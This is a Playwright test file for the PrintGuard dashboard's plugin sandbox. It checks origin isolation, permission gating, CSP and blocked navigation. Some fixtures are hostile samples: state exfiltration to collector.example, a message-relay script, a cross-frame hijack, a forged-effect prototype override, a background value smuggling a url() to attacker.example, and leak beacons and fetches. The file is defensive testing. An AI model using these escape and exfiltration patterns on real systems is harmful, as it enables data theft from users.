import { readFileSync } from "node:fs";
import { expect, test } from "@playwright/test";

const PROBE = `
plugin.render((ctx) => ({
  type: "col",
  children: [
    { type: "text", value: "origin:" + String(window.origin) },
    { type: "text", value: "fetch:" + typeof fetch },
    { type: "text", value: "socket:" + typeof WebSocket },
    { type: "text", value: "storage:" + (() => { try { return typeof localStorage; } catch { return "blocked"; } })() },
    { type: "text", value: "parent:" + (() => { try { return String(parent.document.title); } catch { return "blocked"; } })() },
    { type: "text", value: "monitors:" + (ctx.state.monitors || []).length },
  ],
}));
`;

async function runInFrame(
  page: import("@playwright/test").Page,
  url: string,
  messages: Record<string, unknown>[],
  until: string,
  pause = 0,
) {
  return page.evaluate(
    ([url, messages, until, pause]) =>
      new Promise<any>((resolve, reject) => {
        const frame = document.createElement("iframe");
        const { port1, port2 } = new MessageChannel();
        frame.src = url;
        frame.sandbox.add("allow-scripts");
        frame.allow = "";
        frame.addEventListener(
          "load",
          () => {
            frame.contentWindow!.postMessage({ t: "port" }, "*", [port2]);
            for (const message of messages.slice(0, -1)) port1.postMessage(message);
            setTimeout(() => port1.postMessage(messages[messages.length - 1]), pause);
          },
          { once: true },
        );
        port1.onmessage = (event) => {
          if (event.data.t === "failed" || event.data.t === until) resolve(event.data);
        };
        document.body.appendChild(frame);
        setTimeout(() => reject(new Error("sandbox never answered")), 5000);
      }),
    [url, messages, until, pause] as const,
  );
}

const runInSandbox = (page: import("@playwright/test").Page, code: string, state: unknown = {}, pause = 0) =>
  runInFrame(page, "plugin-sandbox.html", [{ id: 1, t: "init", code, store: {} }, { id: 2, t: "state", state }], "result", pause);

const runInPanel = (page: import("@playwright/test").Page, html: string) =>
  runInFrame(page, "plugin-panel.html", [{ t: "init", html, assets: {}, state: {}, theme: {}, store: {} }], "effects");

test("a plugin runs in an opaque origin with no way out", async ({ page }) => {
  await page.goto("/");
  const result = await runInSandbox(page, PROBE, { monitors: [{ id: "a" }, { id: "b" }] });
  const said = Object.fromEntries(result.tree.children.map((c: any) => c.value.split(":")));

  expect(said.origin).toBe("null");
  expect(said.fetch).toBe("undefined");
  expect(said.socket).toBe("undefined");
  expect(said.storage).toBe("blocked");
  expect(said.parent).toBe("blocked");
  expect(said.monitors).toBe("2");
});

test("a plugin that throws is reported rather than silently dead", async ({ page }) => {
  await page.goto("/");
  const result = await runInSandbox(page, "plugin.render(() => { throw new Error('boom'); });");

  expect(result.t).toBe("failed");
  expect(result.message).toContain("boom");
});

test("effects come back for the host to check rather than being performed", async ({ page }) => {
  await page.goto("/");
  const result = await runInSandbox(
    page,
    "plugin.render((ctx) => { ctx.command({ cmd: 'printer.action', action: 'cancel' }); return { type: 'text', value: 'hi' }; });",
  );

  expect(result.effects).toEqual([{ kind: "command", cmd: { cmd: "printer.action", action: "cancel" } }]);
});

test("code only runs when it came from the frame's host", async ({ page }) => {
  await page.goto("/");
  const result = await page.evaluate(
    () =>
      new Promise<any>((resolve, reject) => {
        const frame = document.createElement("iframe");
        const { port1, port2 } = new MessageChannel();
        frame.src = "plugin-sandbox.html";
        frame.sandbox.add("allow-scripts");
        const bystander = document.createElement("iframe");
        frame.addEventListener("load", () => {
          const script = bystander.contentDocument!.createElement("script");
          script.textContent =
            "const hijack = { id: 2, t: 'init', code: \"plugin.render(() => ({ type: 'text', value: 'hijacked' }));\" };" +
            "for (let i = 0; i < parent.frames.length; i++) {" +
            "  const { port1, port2 } = new MessageChannel();" +
            "  parent.frames[i].postMessage({ t: 'port' }, '*', [port2]);" +
            "  port1.postMessage(hijack);" +
            "}";
          bystander.contentDocument!.body.appendChild(script);
          frame.contentWindow!.postMessage({ t: "port" }, "*", [port2]);
          const code = "plugin.render(() => ({ type: 'text', value: 'installed' }));";
          port1.postMessage({ id: 1, t: "init", code, store: {} });
          setTimeout(() => port1.postMessage({ id: 3, t: "state", state: {} }), 100);
        });
        port1.onmessage = (event) => {
          if (event.data.id === 3) resolve(event.data);
        };
        document.body.appendChild(bystander);
        document.body.appendChild(frame);
        setTimeout(() => reject(new Error("sandbox never answered")), 5000);
      }),
  );

  expect(result.tree.value).toBe("installed");
});

const WEBRTC = `["RTCPeerConnection", "webkitRTCPeerConnection", "RTCDataChannel", "RTCIceTransport"].filter((name) => typeof window[name] !== "undefined").join()`;

const framesOfItsOwn = (messages: Record<string, unknown>[]) => `
  window.ran = [];
  window.twinSaid = [];
  addEventListener("message", (event) => window.ran.push(event.data));
  const inline = "<body onload=\\"parent.postMessage('handler', '*')\\"><script>parent.postMessage('script', '*')</scr" + "ipt>";
  for (const [attribute, value] of [["srcdoc", inline], ["src", "javascript:parent.postMessage('url', '*')"], ["src", "data:text/html," + inline]]) {
    const child = document.createElement("iframe");
    child.setAttribute(attribute, value);
    document.body.appendChild(child);
  }
  const twin = document.createElement("iframe");
  twin.srcdoc = "<script>" + document.querySelector("script").textContent + "</scr" + "ipt>";
  twin.addEventListener("load", () => {
    const { port1, port2 } = new MessageChannel();
    port1.onmessage = (event) => window.twinSaid.push(JSON.stringify(event.data));
    twin.contentWindow.postMessage({ t: "port" }, "*", [port2]);
    for (const message of ${JSON.stringify(messages).replace(/<\//g, "<\\/")}) port1.postMessage(message);
  });
  document.body.appendChild(twin);
`;

test("a plugin has no WebRTC, in its own frame or in one it makes", async ({ page }) => {
  await page.goto("/");
  const inTwin = [
    { id: 1, t: "init", code: `plugin.render(() => ({ type: "text", value: "twin has:" + ${WEBRTC} }));` },
    { id: 2, t: "state" },
  ];
  const result = await runInSandbox(
    page,
    `${framesOfItsOwn(inTwin)}
    plugin.render(() => ({ type: "text", value: JSON.stringify({ has: ${WEBRTC}, ran: window.ran, twin: window.twinSaid.join() }) }));`,
    {},
    1000,
  );
  const said = JSON.parse(result.tree.value);

  expect(said.has).toBe("");
  expect(said.ran).toEqual([]);
  expect(said.twin).toContain('twin has:"');
});

test("a panel has no WebRTC, in its own frame or in one it makes", async ({ page }) => {
  await page.goto("/");
  const inTwin = [{ t: "init", html: `<p>drawn</p><script>pg.log("twin has:" + ${WEBRTC});</scr` + "ipt>" }];
  const result = await runInPanel(
    page,
    `<p>drawn</p><script>${framesOfItsOwn(inTwin)}
    setTimeout(() => pg.log(JSON.stringify({ has: ${WEBRTC}, ran: window.ran, twin: window.twinSaid.join() })), 1000);</script>`,
  );
  const said = JSON.parse(result.effects[0].text);

  expect(said.has).toBe("");
  expect(said.ran).toEqual([]);
  expect(said.twin).toContain('twin has:"');
});

test("a panel's inline handler is refused, and its scripts still run", async ({ page }) => {
  await page.goto("/");
  const result = await runInPanel(page, `<button id="b" onclick="pg.log('handler')">x</button><script>document.getElementById("b").click(); pg.log("script");</script>`);

  expect(result.effects.map((effect: any) => effect.text)).toEqual(["script"]);
});

const PIP = `
plugin.action((name, arg, ctx) => {
  if (name === "toggle") ctx.store.picked = [arg];
});
plugin.render((ctx) => ({
  type: "col",
  children: [
    { type: "row", children: (ctx.state.cameras || []).map((c) => ({ type: "button", label: c.name, action: "toggle", arg: c.id })) },
    { type: "camera", camera_id: (ctx.store.picked || ["c1"])[0] },
  ],
}));
`;

const PLUGIN = {
  id: "pip",
  manifest: {
    id: "pip", name: "Picture in picture", version: "1.0.0", description: "", author: "", homepage: "",
    permissions: ["state:read", "camera:view"], reasons: {}, surfaces: ["panel"], platforms: [], assets: [],
    urls: [], secrets: {}, provides: {}, consumes: [], oauth: {}, events: [], tick_s: 0,
  },
  files: ["plugin.js"],
  digests: {},
  source: { kind: "github", repo: "oliverbravery/PrintGuard", ref: "abc1234" },
  granted: ["state:read", "camera:view"],
  config: {},
  verified: true,
  enabled: true,
  installed: 0,
  failure: null,
};

const MONITOR_PIP = `
plugin.render((ctx) => {
  const monitor = (ctx.state.monitors || []).find((candidate) => candidate.id === ctx.target);
  if (!monitor) return null;
  return { type: "float", label: "Float " + monitor.name, camera_id: monitor.camera_id };
});
`;

const MONITOR = {
  id: "m1", name: "Bench", camera_id: "c1", printer_id: "", enabled: true, threshold: 0.6,
  consecutive: 3, notify: true, on_defect: "pause", cooldown_s: 30, alert: null, watching: true, result: null,
};

const PERMISSIONS = [
  { id: "state:read", label: "Read", description: "", fields: { cameras: ["id", "name", "online"], monitors: ["id", "name", "camera_id", "alert"] } },
  { id: "camera:view", label: "Cameras", description: "" },
  { id: "printer:control", label: "Control printers", description: "", commands: ["printer.action"] },
];

async function dashboardWithPlugin(
  page: import("@playwright/test").Page,
  code: string,
  granted = PLUGIN.granted,
  surfaces = PLUGIN.manifest.surfaces,
  assets: Record<string, string> = {},
  file = "plugin.js",
) {
  await page.addInitScript(() => {
    class Offline extends EventTarget {
      readyState = 0;
      send(): void {}
      close(): void {}
    }
    (window as unknown as { WebSocket: unknown }).WebSocket = Offline;
  });
  await page.goto("/");
  await page.waitForFunction(() => Boolean((window as any).__pg.getState().link));
  await page.evaluate(
    ({ plugin, permissions, code, granted, surfaces, monitor, assets, file }) => {
      const win = window as any;
      const sent: any[] = [];
      win.__sent = sent;
      win.__pg.setState({
        phase: "ready",
        link: { send: (cmd: any) => sent.push(cmd), close() {} },
        engine: {
          version: "test", update: null,
          cameras: [
            {
              id: "c1", name: "Workshop", source: { kind: "rtsp", url: "rtsp://camera" }, printer_id: null,
              max_fps: 30, detect_fps: 60, brightness: 1, contrast: 1, sharpness: 0, crop: null, rotation: 0,
              target_fps: 30, achieved_fps: 29.8, inferring: false, in_use: true, online: true, standby: false, last_result: null,
            },
          ],
          printers: [], prints: [], reviews: [], monitors: [monitor], tokens: [], integrations: [], notifiers: [],
          settings: { notifiers: {}, update_check: true, theme: "dark", themes: [], layout: {} },
          stats: { inference_device: "CPU", infer_ms: 1, capacity_fps: 1 },
          plugins: [{ ...plugin, manifest: { ...plugin.manifest, surfaces, events: ["result"] }, granted, files: [file] }],
          plugin_permissions: permissions,
          plugin_events: { state: [], result: ["monitor_id", "prediction"] },
          plugin_assets: { png: "image/png", txt: "text/plain", mp3: "audio/mpeg" },
        },
      });
      win.__pgEvent({ event: "state", ...win.__pg.getState().engine });
      const request = sent.find((c) => c.cmd === "plugin.code");
      win.__pgEvent({ event: "plugin_code", id: "pip", sources: { [file]: code }, assets, req_id: request?.req_id });
    },
    { plugin: PLUGIN, permissions: PERMISSIONS, code, granted, surfaces, monitor: MONITOR, assets, file },
  );
  if (file === "panel.html") await expect(page.locator("iframe[title='Picture in picture panel']")).toBeAttached();
  else await expect.poll(() => page.evaluate(() => Object.keys((window as any).__pg.getState().pluginTrees).length)).toBeGreaterThan(0);
}

test("a panel.html draws itself in a frame of its own", async ({ page }) => {
  await dashboardWithPlugin(page, "<p>drawn by the panel</p>", ["state:read"], ["panel"], {}, "panel.html");

  await expect(page.frameLocator("iframe[title='Picture in picture panel']").getByText("drawn by the panel")).toBeVisible();
});

const LEAVES = {
  "plugin.js": (to: string) =>
    `plugin.render((ctx) => { if (ctx.state.monitors[0].alert) location.href = "${to}?state=" + encodeURIComponent(JSON.stringify(ctx.state)); return { type: "text", value: "drawn" }; });`,
  "panel.html": (to: string) =>
    `<p>drawn</p><script>pg.on("state", (state) => { if (state.monitors[0].alert) location.replace("${to}?state=" + encodeURIComponent(JSON.stringify(state))); });</scr` + `ipt>`,
};
const RELAY = `<!doctype html><script>
  addEventListener("message", (event) => {
    fetch("/overheard", { method: "POST", body: JSON.stringify(event.data) });
    for (const port of event.ports) port.onmessage = (told) => fetch("/overheard", { method: "POST", body: JSON.stringify(told.data) });
  });
</scr` + `ipt>`;

for (const file of ["plugin.js", "panel.html"] as const) {
  for (const to of ["https://collector.example/landed", "/elsewhere"]) {
    test(`a ${file} that sends its frame to ${to} is stopped and told nothing more`, async ({ page }) => {
      const reached: string[] = [];
      await page.route(/collector\.example|\/elsewhere|\/overheard/, (route) => {
        reached.push(new URL(route.request().url()).pathname);
        return route.fulfill({ contentType: "text/html", body: RELAY });
      });
      await dashboardWithPlugin(page, LEAVES[file](to), ["state:read"], ["panel"], {}, file);
      const alert = (ts: number) =>
        page.evaluate((ts) => {
          const win = window as any;
          const engine = win.__pg.getState().engine;
          win.__pgEvent({ event: "state", ...engine, monitors: engine.monitors.map((m: any) => ({ ...m, alert: { ts, score: 0.9, action: "pause" } })) });
        }, ts);

      await alert(1);
      await expect.poll(() => page.evaluate(() => (window as any).__pg.getState().pluginFailures.pip)).toBe("sandbox navigated away");
      await expect(page.locator("iframe")).toHaveCount(0);
      await alert(2);
      await page.waitForTimeout(500);

      expect(reached).toEqual(to === "/elsewhere" ? ["/elsewhere"] : []);
    });
  }
}

test("an installed plugin draws its panel with a real camera feed", async ({ page }) => {
  await dashboardWithPlugin(page, PIP);

  const panel = page.locator("section", { hasText: "Picture in picture" });
  await expect(panel.getByRole("button", { name: "Workshop" })).toBeVisible();
  await expect(panel.locator("video")).toBeAttached();
  await expect(panel.getByText("verified")).toBeVisible();
});

test("a camera node is refused when the feed permission is not granted", async ({ page }) => {
  await dashboardWithPlugin(page, PIP, ["state:read"]);

  const panel = page.locator("section", { hasText: "Picture in picture" });
  await expect(panel.getByText("Camera feeds not permitted")).toBeVisible();
  await expect(panel.locator("video")).toHaveCount(0);
});

test("a command the plugin was not granted never reaches the engine", async ({ page }) => {
  await dashboardWithPlugin(
    page,
    "plugin.render((ctx) => { ctx.command({ cmd: 'printer.action', id: 'p1', action: 'cancel' }); return { type: 'text', value: 'drawn' }; });",
  );

  await expect(page.getByText("drawn")).toBeVisible();
  const sent = await page.evaluate(() => (window as any).__sent.map((c: any) => c.cmd));
  expect(sent).not.toContain("printer.action");
  await expect(page.getByText("without permission")).toBeVisible();
});

const FORGED_LINK = `
const push = Array.prototype.push;
Array.prototype.push = function (effect) {
  if (effect && effect.kind === "link") effect.action = this.length ? "call" : "remove";
  return push.call(this, effect);
};
plugin.render((ctx) => { ctx.call({ to: "other", channel: "now" }); ctx.call({ to: "other", channel: "now" }); return { type: "text", value: "drawn" }; });
`;

test("a link effect reaches only the commands that talk to plugins", async ({ page }) => {
  await dashboardWithPlugin(page, FORGED_LINK);

  await expect(page.getByText("drawn")).toBeVisible();
  const sent = await page.evaluate(() => (window as any).__sent.map((c: any) => c.cmd));
  expect(sent).toContain("plugin.call");
  expect(sent).not.toContain("plugin.remove");
});

async function stubFloat(page: import("@playwright/test").Page) {
  await page.addInitScript(() => {
    const win = window as any;
    win.__floated = 0;
    Object.defineProperty(Document.prototype, "pictureInPictureEnabled", { get: () => true, configurable: true });
    Object.defineProperty(HTMLMediaElement.prototype, "readyState", { get: () => 1, configurable: true });
    HTMLVideoElement.prototype.requestPictureInPicture = function () {
      win.__floated += 1;
      return Promise.resolve({} as PictureInPictureWindow);
    };
  });
}

test("a monitor surface draws on each monitor and nothing on the dashboard", async ({ page }) => {
  await stubFloat(page);
  await dashboardWithPlugin(page, MONITOR_PIP, PLUGIN.granted, ["monitor"]);

  await expect(page.locator("section", { hasText: "Picture in picture" })).toHaveCount(0);
  await page.getByRole("button", { name: "Float Bench" }).click();

  await expect.poll(() => page.evaluate(() => (window as any).__floated)).toBe(1);
});

test("a camera drawn twice still floats after one of the two goes away", async ({ page }) => {
  await stubFloat(page);
  await dashboardWithPlugin(page, MONITOR_PIP, PLUGIN.granted, ["monitor"]);

  await page.getByRole("button", { name: "Open Bench monitor details" }).click();
  await page.getByRole("button", { name: "Close monitor details" }).click();
  await page.getByRole("button", { name: "Float Bench" }).click();

  await expect.poll(() => page.evaluate(() => (window as any).__floated)).toBe(1);
});


async function silentAudio(page: import("@playwright/test").Page) {
  await page.addInitScript(() => {
    const win = window as any;
    win.__tones = 0;
    win.AudioContext = class {
      currentTime = 0;
      destination = {};
      resume() {
        return Promise.resolve();
      }
      createGain() {
        return { gain: { value: 0, setValueAtTime() {}, exponentialRampToValueAtTime() {} }, connect: (node: any) => node };
      }
      createOscillator() {
        win.__tones += 1;
        return { type: "", frequency: { setValueAtTime() {} }, connect: (node: any) => node, start() {}, stop() {} };
      }
    };
  });
}

const NOISY = "plugin.render((ctx) => { ctx.sound([{ hz: 880, ms: 100 }]); return { type: 'text', value: 'drawn' }; });";

test("a sound plays for a plugin granted it", async ({ page }) => {
  await silentAudio(page);
  await dashboardWithPlugin(page, NOISY, ["sound"]);

  await expect(page.getByText("drawn")).toBeVisible();
  expect(await page.evaluate(() => (window as any).__tones)).toBeGreaterThan(0);
});

test("a sound stays quiet for a plugin that was not granted it", async ({ page }) => {
  await silentAudio(page);
  await dashboardWithPlugin(page, NOISY, ["state:read"]);

  await expect(page.getByText("drawn")).toBeVisible();
  expect(await page.evaluate(() => (window as any).__tones)).toBe(0);
});

const SOUNDS = readFileSync(new URL("../../plugins/alert-sounds/plugin.js", import.meta.url), "utf8");

test("the sounds plugin stays quiet until a monitor is switched on and a fresh alert lands", async ({ page }) => {
  await silentAudio(page);
  await dashboardWithPlugin(page, SOUNDS, ["state:read", "sound"], ["settings"]);

  await expect(page.locator("section", { hasText: "Picture in picture" })).toHaveCount(0);
  await page.getByRole("button", { name: "Open Bench monitor details" }).click();
  await page.getByLabel("Sound an alert").click();
  await expect(page.getByLabel("Alert sound")).toBeVisible();
  expect(await page.evaluate(() => (window as any).__tones)).toBe(0);

  await page.evaluate(() => {
    const win = window as any;
    const engine = win.__pg.getState().engine;
    win.__pgEvent({ event: "state", ...engine, monitors: engine.monitors.map((m: any) => ({ ...m, alert: { ts: 123, score: 0.9, action: "pause" } })) });
  });

  await expect.poll(() => page.evaluate(() => (window as any).__tones)).toBeGreaterThan(0);
});

const FIELDS = `
plugin.action((name, arg, ctx) => { ctx.store[name] = arg; });
plugin.render((ctx) => ({
  type: "col",
  children: [
    { type: "input", label: "Webhook", action: "url", value: ctx.store.url || "", placeholder: "https://" },
    { type: "toggle", label: "Loud", action: "loud", on: ctx.store.loud === true },
    { type: "image", asset: "icon.png", label: "Logo" },
    { type: "text", value: "url:" + (ctx.store.url || "") + " loud:" + (ctx.store.loud === true) + " read:" + (ctx.assets["notes.txt"] || "") },
  ],
}));
`;

test("a plugin takes input and shows the files it shipped", async ({ page }) => {
  const PNG =
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
  await dashboardWithPlugin(page, FIELDS, ["state:read"], ["panel"], {
    "icon.png": PNG,
    "notes.txt": btoa("hello"),
  });

  const panel = page.locator("section", { hasText: "Picture in picture" });
  await panel.getByLabel("Webhook").fill("https://hooks.example.com/x");
  await panel.getByLabel("Webhook").blur();
  await panel.getByLabel("Loud").click();

  await expect(panel.getByText("url:https://hooks.example.com/x loud:true read:hello")).toBeVisible();
  await expect(panel.getByAltText("Logo")).toHaveJSProperty("naturalWidth", 1);
});

test("a plugin panel rearranges with the monitors", async ({ page }) => {
  await dashboardWithPlugin(page, PIP);
  await page.evaluate(() => (window as any).__pg.setState({ customising: true }));

  const panel = page.locator("section", { hasText: "Picture in picture" });
  await panel.getByRole("button", { name: "Hide Picture in picture" }).click();
  await expect(page.locator("section", { hasText: "Picture in picture" })).toHaveCount(0);
  await page.getByRole("button", { name: "Picture in picture · show" }).click();

  const grid = page.locator("main .grid").first();
  const tiles = () => grid.locator("> *").evaluateAll((all) => all.map((tile) => tile.textContent?.slice(0, 8)));
  const before = await tiles();
  const handle = page.getByRole("button", { name: "Drag Picture in picture to reorder" });
  const from = (await handle.boundingBox())!;
  const target = (await grid.locator("> *").first().boundingBox())!;
  await page.mouse.move(from.x + from.width / 2, from.y + from.height / 2);
  await page.mouse.down();
  for (let step = 1; step <= 12; step++) {
    await page.mouse.move(from.x - ((from.x - target.x - 40) * step) / 12, from.y + from.height / 2, { steps: 2 });
  }
  await page.mouse.up();

  await expect.poll(tiles).not.toEqual(before);
  const saved = () => page.evaluate(() => (window as any).__sent.filter((c: any) => c.patch?.layout).pop());
  await expect.poll(async () => (await saved())?.patch.layout.monitors.order).toContain("pip");
});


test("glass takes the text colour its tone can carry", async ({ page }) => {
  await dashboardWithPlugin(page, PIP);
  const textShown = () =>
    page.evaluate(() => {
      const tile = document.querySelector("main .panel") as HTMLElement;
      const probe = document.createElement("div");
      probe.style.color = getComputedStyle(tile).getPropertyValue("--color-text-1");
      tile.appendChild(probe);
      const shown = getComputedStyle(probe).color;
      probe.remove();
      return shown;
    });
  const wear = (opacity: number, tone: number) =>
    page.evaluate(async (glass) => {
      const { applyTheme } = await import("/src/theme.ts" as string);
      applyTheme("glass", [], glass);
    }, { opacity, tone });

  await wear(0.38, 0.08);
  expect(await textShown()).toBe("rgb(255, 255, 255)");

  await wear(0.7, 0.95);
  expect(await textShown()).toBe("rgb(0, 0, 0)");
});


test("an event never wipes the per-monitor views the plugin drew", async ({ page }) => {
  await stubFloat(page);
  await dashboardWithPlugin(page, `${MONITOR_PIP}\nplugin.on('result', () => {});`, PLUGIN.granted, ["monitor"]);
  const float = page.getByRole("button", { name: "Float Bench" });

  await expect(float).toBeVisible();
  for (let round = 0; round < 5; round += 1) {
    await page.evaluate(() => (window as any).__pgEvent({ event: "result", monitor_id: "m1", prediction: "failure" }));
    await expect(float).toBeVisible();
  }
});


test("a camera the plugin may not view is never floated", async ({ page }) => {
  await stubFloat(page);
  await dashboardWithPlugin(page, MONITOR_PIP, ["state:read"], ["monitor"]);

  await expect(page.getByRole("button", { name: "Float Bench" })).toHaveCount(0);
});

test("a float node in a panel floats without a round trip to the sandbox", async ({ page }) => {
  await stubFloat(page);
  await dashboardWithPlugin(page, "plugin.render(() => ({ type: 'float', label: 'Float it', camera_id: 'c1' }));");

  const panel = page.locator("section", { hasText: "Picture in picture" });
  await panel.getByRole("button", { name: "Float it" }).click();

  expect(await page.evaluate(() => (window as any).__sent.filter((c: any) => c.cmd === "plugin.act").length)).toBe(0);
  expect(await page.evaluate(() => (window as any).__floated)).toBe(1);
});

test("a background is only ever a base64 picture, so it cannot smuggle a second address", async ({ page }) => {
  await dashboardWithPlugin(page, PIP, ["background"]);
  const picture = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
  const paint = (image: string) =>
    page.evaluate((image) => {
      const win = window as any;
      win.__pgEvent({ event: "plugin_effect", id: "pip", effect: { kind: "background", image } });
      return win.__pg.getState().background?.image ?? null;
    }, image);

  expect(await paint(picture)).toBe(picture);
  expect(await paint('data:image/png;base64,AAAA"), url("https://attacker.example/?d=1')).toBeNull();
  expect(await paint("data:image/svg+xml;base64,PHN2Zy8+")).toBeNull();
});

const PAGE_POLICY = [...readFileSync(new URL("../../printguard/server/app.py", import.meta.url), "utf8").match(/PLUGIN_PAGE_CSP = \(([^)]*)\)/)![1].matchAll(/"([^"]*)"/g)]
  .map((piece) => piece[1])
  .join("");

const OWN_PAGE = `<!doctype html><title>served</title>
<style>body { color: rgb(1, 2, 3); }</style>
<link rel="stylesheet" href="https://elsewhere.example/leak.css">
<img src="https://elsewhere.example/leak.png"><img src="/api/v1/leak.png">
<img id="inline" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==">
<script src="https://elsewhere.example/leak.js"></script>
<iframe src="https://elsewhere.example/leak-frame"></iframe>
<form id="own" method="post" action="/plugins/demo/login"><input name="user" value="me"></form>
<form id="away" method="post" action="https://elsewhere.example/leak-form"><input name="user" value="me"></form>
<script>
  const tried = [document.getElementById("inline").decode(), fetch("https://elsewhere.example/leak-fetch"), fetch("/api/health")];
  navigator.sendBeacon("https://elsewhere.example/leak-beacon", "x");
  try { new WebSocket("wss://elsewhere.example/leak-socket"); } catch {}
  Promise.allSettled(tried).then((fetched) => {
    document.title = [getComputedStyle(document.body).color, ...fetched.map((f) => f.status)].join(" ");
  });
</script>`;

test("a plugin's own page styles, scripts and posts back to the hub, and reaches nothing else", async ({ page, baseURL }) => {
  const asked: string[] = [];
  await page.route(/elsewhere\.example|\/api\//, (route) => {
    asked.push(route.request().url());
    return route.fulfill({ contentType: "text/plain", body: "" });
  });
  await page.route("**/plugins/demo/**", (route) => {
    const signedIn = route.request().method() === "POST";
    return route.fulfill({
      contentType: "text/html",
      headers: { "Content-Security-Policy": PAGE_POLICY },
      body: signedIn ? `<title>signed in as ${route.request().postData()}</title>` : OWN_PAGE,
    });
  });

  expect(PAGE_POLICY).toContain("sandbox allow-forms allow-scripts");
  expect(PAGE_POLICY).toContain("frame-ancestors 'none'");
  await page.goto(`${baseURL}/plugins/demo/page`);
  await expect(page).toHaveTitle("rgb(1, 2, 3) fulfilled rejected rejected");
  await page.evaluate(() => (document.getElementById("away") as HTMLFormElement).submit());
  await page.waitForTimeout(300);
  expect(asked).toEqual([]);

  await page.goto(`${baseURL}/plugins/demo/page`);
  await page.evaluate(() => (document.getElementById("own") as HTMLFormElement).submit());
  await expect(page).toHaveTitle("signed in as user=me");
});
